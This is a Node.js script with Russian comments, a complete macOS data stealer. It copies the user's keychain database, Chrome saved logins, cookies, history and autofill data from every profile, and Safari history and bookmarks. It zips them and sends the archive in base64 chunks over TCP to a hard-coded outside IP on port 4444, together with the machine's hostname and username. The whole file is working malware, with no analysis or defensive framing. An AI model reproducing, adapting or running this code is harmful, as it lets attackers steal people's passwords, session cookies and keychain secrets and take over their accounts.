// collect-and-send.js - Единый скрипт для сбора и отправки данных с macOS
const fs = require('fs');
const os = require('os');
const path = require('path');
const net = require('net');
const { exec, execSync } = require('child_process');
const crypto = require('crypto');

// ===================== КОНФИГУРАЦИЯ =====================
const CONFIG = {
    // Адрес сервера для отправки данных
    serverHost: '138.124.90.175', // Замените на адрес вашего сервера
    serverPort: 4444,             // Замените на порт вашего сервера
    
    // Настройки передачи файлов
    chunkSize: 256 * 1024,        // 256KB размер чанка
    retryDelay: 5000,             // 5 секунд между попытками
    maxRetries: 5,                // Максимум 5 попыток переподключения
    
    // Директории
    stableDir: 'Stable',          // Директория для сбора данных
    zipFileName: 'Stable.zip',    // Имя архива
    
    // Список важных файлов Chrome для копирования
    chromeImportantFiles: [
        'Web Data', 'Web Data-journal', 
        'Login Data', 'Login Data-journal', 
        'History', 'History-journal', 
        'Cookies', 'Cookies-journal', 
        'Bookmarks', 
        'Secure Preferences'
    ]
};

// ===================== УТИЛИТЫ ЛОГИРОВАНИЯ =====================
// Глобальная переменная для хранения логов
let allLogs = [];

// Функция для логирования
function log(message, isError = false) {
    const timestamp = new Date().toISOString();
    const logMessage = `[${timestamp}] ${message}`;
    
    // Сохраняем лог в памяти
    allLogs.push(logMessage);
    
    // Выводим в консоль
    if (isError) {
        console.error(logMessage);
    } else {
        console.log(logMessage);
    }
    
    // Сохраняем логи в файл
    try {
        fs.appendFileSync('collector.log', `${logMessage}\n`);
    } catch (error) {
        console.error(`Error writing to log: ${error.message}`);
    }
}

// ===================== УТИЛИТЫ ДЛЯ РАБОТЫ С ФАЙЛАМИ =====================
// Функция для создания директории
function createDirectory(dirPath) {
    try {
        if (!fs.existsSync(dirPath)) {
            fs.mkdirSync(dirPath, { recursive: true });
            log(`Directory created: ${dirPath}`);
        } else {
            log(`Directory already exists: ${dirPath}`);
        }
        return true;
    } catch (error) {
        log(`Error creating directory ${dirPath}: ${error.message}`, true);
        return false;
    }
}

// Функция для копирования файла
function copyFile(source, destination) {
    try {
        fs.copyFileSync(source, destination);
        log(`File copied: ${source} -> ${destination}`);
        return true;
    } catch (error) {
        log(`Error copying file ${source}: ${error.message}`, true);
        return false;
    }
}

// Функция для выполнения команды
function executeCommand(command) {
    try {
        log(`Executing command: ${command}`);
        const output = execSync(command, { encoding: 'utf8' });
        log(`Command output: ${output.trim()}`);
        return { success: true, output };
    } catch (error) {
        log(`Error executing command: ${error.message}`, true);
        if (error.stderr) log(`stderr: ${error.stderr}`, true);
        return { success: false, error };
    }
}

// Функция для форматирования размера файла
function formatFileSize(bytes) {
    if (bytes === 0) return '0 Bytes';
    
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

// Функция для генерации уникального ID клиента
function generateClientId() {
    try {
        const macAddress = getMacAddress();
        const hostname = os.hostname();
        const username = os.userInfo().username;
        
        const hash = crypto.createHash('md5')
            .update(`${macAddress}:${hostname}:${username}`)
            .digest('hex')
            .substring(0, 8);
        
        return hash;
    } catch (error) {
        return Math.random().toString(36).substring(2, 10);
    }
}

// Функция для получения MAC-адреса
function getMacAddress() {
    try {
        const networkInterfaces = os.networkInterfaces();
        for (const name of Object.keys(networkInterfaces)) {
            for (const netInterface of networkInterfaces[name]) {
                if (!netInterface.internal && netInterface.mac !== '00:00:00:00:00:00') {
                    return netInterface.mac;
                }
            }
        }
        return 'unknown';
    } catch (error) {
        return 'unknown';
    }
}

// ===================== СБОР ДАННЫХ =====================
// Функция для сбора всех необходимых данных
async function collectData() {
    try {
        log('===== НАЧАЛО СБОРА ДАННЫХ =====');
        
        // 1. Создаем директорию Stable
        if (!createDirectory(CONFIG.stableDir)) {
            throw new Error('Failed to create Stable directory');
        }
        
        // 2. Получаем имя пользователя
        const username = os.userInfo().username;
        log(`Current user: ${username}`);
        
        // 3. Копируем Keychain базу данных
        const keychainSource = `/Users/${username}/Library/Keychains/login.keychain-db`;
        const keychainTarget = path.join(CONFIG.stableDir, 'login.keychain-db');
        
        if (fs.existsSync(keychainSource)) {
            copyFile(keychainSource, keychainTarget);
        } else {
            log(`Keychain file not found: ${keychainSource}`, true);
        }
        
        // 4. Копируем данные Chrome для всех профилей
        try {
            // Базовая директория Chrome
            const chromeBaseDir = `/Users/${username}/Library/Application Support/Google/Chrome`;
            
            // Проверяем наличие директории Chrome
            if (fs.existsSync(chromeBaseDir)) {
                // Получаем список всех профилей
                const profileDirs = [];
                
                // Добавляем стандартный профиль
                if (fs.existsSync(path.join(chromeBaseDir, 'Default'))) {
                    profileDirs.push('Default');
                }
                
                // Ищем другие профили (Profile 1, Profile 2, и т.д.)
                try {
                    const dirEntries = fs.readdirSync(chromeBaseDir, { withFileTypes: true });
                    for (const entry of dirEntries) {
                        if (entry.isDirectory() && entry.name.startsWith('Profile ')) {
                            profileDirs.push(entry.name);
                        }
                    }
                } catch (e) {
                    log(`Error scanning Chrome profiles: ${e.message}`, true);
                }
                
                log(`Found ${profileDirs.length} Chrome profiles: ${profileDirs.join(', ')}`);
                
                // Копируем данные из каждого профиля
                for (const profile of profileDirs) {
                    const profileSourceDir = path.join(chromeBaseDir, profile);
                    const profileTargetDir = path.join(CONFIG.stableDir, `Chrome_${profile}`);
                    
                    // Создаем директорию для профиля
                    createDirectory(profileTargetDir);
                    
                    // Копируем важные файлы
                    for (const file of CONFIG.chromeImportantFiles) {
                        const sourcePath = path.join(profileSourceDir, file);
                        const targetPath = path.join(profileTargetDir, file);
                        
                        if (fs.existsSync(sourcePath)) {
                            copyFile(sourcePath, targetPath);
                        } else {
                            log(`Chrome file not found in profile ${profile}: ${sourcePath}`);
                        }
                    }
                    
                    log(`Chrome data for profile ${profile} copied successfully`);
                }
            } else {
                log(`Chrome directory not found: ${chromeBaseDir}`, true);
            }
        } catch (error) {
            log(`Error copying Chrome data: ${error.message}`, true);
        }
        
        // 5. Копируем Safari данные
        try {
            const safariDir = `/Users/${username}/Library/Safari`;
            const safariTargetDir = path.join(CONFIG.stableDir, 'Safari');
            
            // Создаем директорию для Safari данных
            createDirectory(safariTargetDir);
            
            // Список важных файлов Safari
            const safariFiles = [
                'History.db', 'History.db-shm', 'History.db-wal',
                'Bookmarks.plist', 'LastSession.plist', 
                'Extensions/Extensions.plist'
            ];
            
            // Копируем каждый файл
            for (const file of safariFiles) {
                const sourcePath = path.join(safariDir, file);
                const targetDir = path.dirname(path.join(safariTargetDir, file));
                
                // Создаем поддиректории при необходимости
                createDirectory(targetDir);
                
                if (fs.existsSync(sourcePath)) {
                    const targetPath = path.join(safariTargetDir, file);
                    copyFile(sourcePath, targetPath);
                } else {
                    log(`Safari file not found: ${sourcePath}`);
                }
            }
            
            log('Safari data copied successfully');
        } catch (error) {
            log(`Error copying Safari data: ${error.message}`, true);
        }
        
        // 6. Создаем архив с оптимальными параметрами сжатия
        log('Creating ZIP archive...');
        const zipResult = executeCommand(`zip -r -1 ${CONFIG.zipFileName} ${CONFIG.stableDir} -x "*.DS_Store"`);
        
        if (!zipResult.success) {
            throw new Error('Failed to create ZIP archive');
        }
        
        log('ZIP archive created successfully');
        
        // Проверяем, что архив создан и получаем его размер
        if (fs.existsSync(CONFIG.zipFileName)) {
            const stats = fs.statSync(CONFIG.zipFileName);
            log(`Archive size: ${formatFileSize(stats.size)}`);
        } else {
            throw new Error('ZIP archive file not found after creation');
        }
        
        log('===== СБОР ДАННЫХ ЗАВЕРШЕН =====');
        return true;
    } catch (error) {
        log(`Error in data collection: ${error.message}`, true);
        return false;
    }
}

// ===================== ОТПРАВКА ДАННЫХ =====================

// Глобальные переменные для отправки файла
let socket;
let retryCount = 0;
let clientId = generateClientId();
let totalChunks = 0;
let currentChunk = 0;
let fileSize = 0;
let fileName = '';
let transferStartTime = 0;

// Форматируем время
function formatDuration(seconds) {
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = Math.round(seconds % 60);
    
    if (minutes > 0) {
        return `${minutes}m ${remainingSeconds}s`;
    } else {
        return `${remainingSeconds}s`;
    }
}

// Вычисляем скорость передачи
function calculateSpeed(bytesSent, elapsedSeconds) {
    if (elapsedSeconds === 0) return 'N/A';
    
    const bytesPerSecond = bytesSent / elapsedSeconds;
    
    if (bytesPerSecond < 1024) {
        return `${bytesPerSecond.toFixed(2)} B/s`;
    } else if (bytesPerSecond < 1024 * 1024) {
        return `${(bytesPerSecond / 1024).toFixed(2)} KB/s`;
    } else {
        return `${(bytesPerSecond / (1024 * 1024)).toFixed(2)} MB/s`;
    }
}

// Отправляем файл на сервер по частям
async function sendFileInChunks(filePath, socket) {
    try {
        // Проверяем существование файла
        if (!fs.existsSync(filePath)) {
            log(`File not found: ${filePath}`, true);
            return false;
        }
        
        // Получаем информацию о файле
        const stats = fs.statSync(filePath);
        if (!stats.isFile()) {
            log(`Path is not a file: ${filePath}`, true);
            return false;
        }
        
        // Сохраняем информацию о файле
        fileName = path.basename(filePath);
        fileSize = stats.size;
        totalChunks = Math.ceil(fileSize / CONFIG.chunkSize);
        
        log(`Preparing to send file: ${fileName}`);
        log(`File size: ${formatFileSize(fileSize)}`);
        log(`Total chunks: ${totalChunks} (${CONFIG.chunkSize} bytes per chunk)`);
        
        // Отправляем идентификатор клиента и системную информацию
        const systemInfo = {
            hostname: os.hostname(),
            platform: os.platform(),
            type: os.type(),
            arch: os.arch(),
            username: os.userInfo().username,
            id: clientId
        };
        
        // Отправляем информацию о клиенте
        socket.write(`Connected - ${systemInfo.hostname} (${systemInfo.platform} ${systemInfo.arch})\n`);
        socket.write(`Current directory: ${process.cwd()}\n`);
        socket.write(`Client ID: ${systemInfo.id}\n`);
        
        // Отправляем информацию о начале передачи файла
        log(`Starting file transfer...`);
        transferStartTime = Date.now();
        
        // Сообщаем о крупном файле, если он больше 10MB
        if (fileSize > 10 * 1024 * 1024) {
            socket.write(`LARGE_FILE:${fileName}:${fileSize}\n`);
            await new Promise(resolve => setTimeout(resolve, 500)); // Даем серверу время обработать
        }
        
        // Отправляем начало чанкированной передачи
        socket.write(`CHUNKED_FILE_START:${fileName}:${fileSize}:${totalChunks}:${CONFIG.chunkSize}\n`);
        await new Promise(resolve => setTimeout(resolve, 500)); // Даем серверу время обработать
        
        // Открываем файл для чтения
        const fileHandle = await fs.promises.open(filePath, 'r');
        const buffer = Buffer.alloc(CONFIG.chunkSize);
        
        // Отправляем файл по частям
        currentChunk = 0;
        let bytesRead;
        
        try {
            while (currentChunk < totalChunks) {
                // Читаем часть файла
                bytesRead = await fileHandle.read(buffer, 0, CONFIG.chunkSize, currentChunk * CONFIG.chunkSize);
                
                if (bytesRead.bytesRead === 0) break;
                
                // Отправляем часть файла
                const chunkBuffer = buffer.slice(0, bytesRead.bytesRead);
                const base64Chunk = chunkBuffer.toString('base64');
                
                // Отправляем чанк данных
                socket.write(`CHUNKED_FILE_DATA:${fileName}:${currentChunk}:${totalChunks}:${base64Chunk}\n`);
                
                // Увеличиваем номер чанка
                currentChunk++;
                
                // Вычисляем и отображаем прогресс
                const progress = (currentChunk / totalChunks) * 100;
                const elapsedTime = (Date.now() - transferStartTime) / 1000;
                const sentBytes = currentChunk * CONFIG.chunkSize;
                const speed = calculateSpeed(sentBytes, elapsedTime);
                
                // Отображаем прогресс каждые 5% или по крайней мере каждые 10 чанков
                if (currentChunk % 10 === 0 || progress % 5 < (CONFIG.chunkSize / fileSize) * 100) {
                    const eta = elapsedTime / progress * (100 - progress);
                    log(`Progress: ${progress.toFixed(1)}% (${currentChunk}/${totalChunks} chunks) | Speed: ${speed} | ETA: ${formatDuration(eta)}`);
                }
                
                // Добавляем небольшую задержку между чанками
                await new Promise(resolve => setTimeout(resolve, 100));
            }
            
            // Отправляем сообщение о завершении передачи
            socket.write(`CHUNKED_FILE_END:${fileName}:${currentChunk}:${fileSize}\n`);
            
            // Вычисляем общее время и скорость
            const totalElapsedTime = (Date.now() - transferStartTime) / 1000;
            const avgSpeed = calculateSpeed(fileSize, totalElapsedTime);
            
            log(`File transfer completed successfully`);
            log(`Total time: ${formatDuration(totalElapsedTime)}`);
            log(`Average speed: ${avgSpeed}`);
            
            return true;
            
        } finally {
            // Закрываем файловый дескриптор
            await fileHandle.close();
        }
    } catch (error) {
        log(`Error sending file: ${error.message}`, true);
        log(error.stack, true);
        return false;
    }
}

// Обработчик ответов от сервера
function handleServerResponse(data) {
    const response = data.toString().trim();
    
    // Логируем только полезные ответы, игнорируем периодические сообщения
    if (response && !response.includes('pwd || cd')) {
        log(`Server response: ${response}`);
    }
    
    // Проверяем сообщение об успешной передаче файла
    if (response.includes('CHUNKED_FILE_END') || response.includes('File uploaded successfully')) {
        log('Server acknowledged successful file transfer');
        
        // Завершаем процесс после успешной передачи файла
        log('File transfer completed. Exiting...');
        socket.end();
        setTimeout(() => process.exit(0), 1000);
    }
}

// Подключаемся к серверу и отправляем файл
function connectAndSendFile(filePath) {
    log(`===== НАЧАЛО ОТПРАВКИ ДАННЫХ =====`);
    log(`Connecting to server ${CONFIG.serverHost}:${CONFIG.serverPort}...`);
    
    socket = new net.Socket();
    
    // Обработчик успешного подключения
    socket.on('connect', async () => {
        log(`Connected to server ${CONFIG.serverHost}:${CONFIG.serverPort}`);
        retryCount = 0;
        
        // Отправляем файл
        const success = await sendFileInChunks(filePath, socket);
        
        if (success) {
            log('File sent. Waiting for server confirmation...');
            // Ожидаем подтверждения от сервера перед выходом
            setTimeout(() => {
                log('Server confirmation timeout. Exiting...');
                socket.end();
                process.exit(0);
            }, 30000); // 30 секунд тайм-аут
        } else {
            log('File transfer failed', true);
            socket.end();
            process.exit(1);
        }
    });
    
    // Обработчик получения данных от сервера
    socket.on('data', handleServerResponse);
    
    // Обработчик ошибок
    socket.on('error', (error) => {
        log(`Connection error: ${error.message}`, true);
        retryConnection(filePath);
    });
    
    // Обработчик закрытия соединения
    socket.on('close', () => {
        log('Connection closed');
        
        // Если передача не завершена, пытаемся переподключиться
        if (currentChunk < totalChunks) {
            retryConnection(filePath);
        }
    });
    
    // Подключаемся к серверу
    socket.connect(CONFIG.serverPort, CONFIG.serverHost);
}

// Функция повторного подключения
function retryConnection(filePath) {
    retryCount++;
    
    if (retryCount <= CONFIG.maxRetries) {
        log(`Retry attempt ${retryCount}/${CONFIG.maxRetries} in ${CONFIG.retryDelay/1000} seconds...`);
        
        setTimeout(() => {
            log(`Reconnecting...`);
            connectAndSendFile(filePath);
        }, CONFIG.retryDelay);
    } else {
        log(`Maximum retry attempts reached (${CONFIG.maxRetries}). Giving up.`, true);
        process.exit(1);
    }
}

// ===================== ГЛАВНАЯ ФУНКЦИЯ =====================
// Главная функция - запускает процесс сбора и отправки данных
async function main() {
    try {
        log('===== ЗАПУСК ПРОГРАММЫ СБОРА И ОТПРАВКИ ДАННЫХ =====');
        log(`Date: ${new Date().toISOString()}`);
        log(`OS: ${os.platform()} ${os.release()} (${os.arch()})`);
        log(`Hostname: ${os.hostname()}`);
        log(`Username: ${os.userInfo().username}`);
        log(`Client ID: ${generateClientId()}`);
        
        // 1. Собираем данные
        const collectionSuccess = await collectData();
        
        if (!collectionSuccess) {
            log('Data collection failed, exiting', true);
            process.exit(1);
        }
        
        // 2. Отправляем данные
        connectAndSendFile(CONFIG.zipFileName);
        
    } catch (error) {
        log(`Fatal error: ${error.message}`, true);
        
        // Сохраняем все логи в отдельный файл в случае критической ошибки
        try {
            fs.writeFileSync('error_report.log', allLogs.join('\n'));
            log('Error report saved to error_report.log');
        } catch (e) {
            console.error('Failed to save error report:', e);
        }
        
        process.exit(1);
    }
}

// Запускаем основную функцию
main();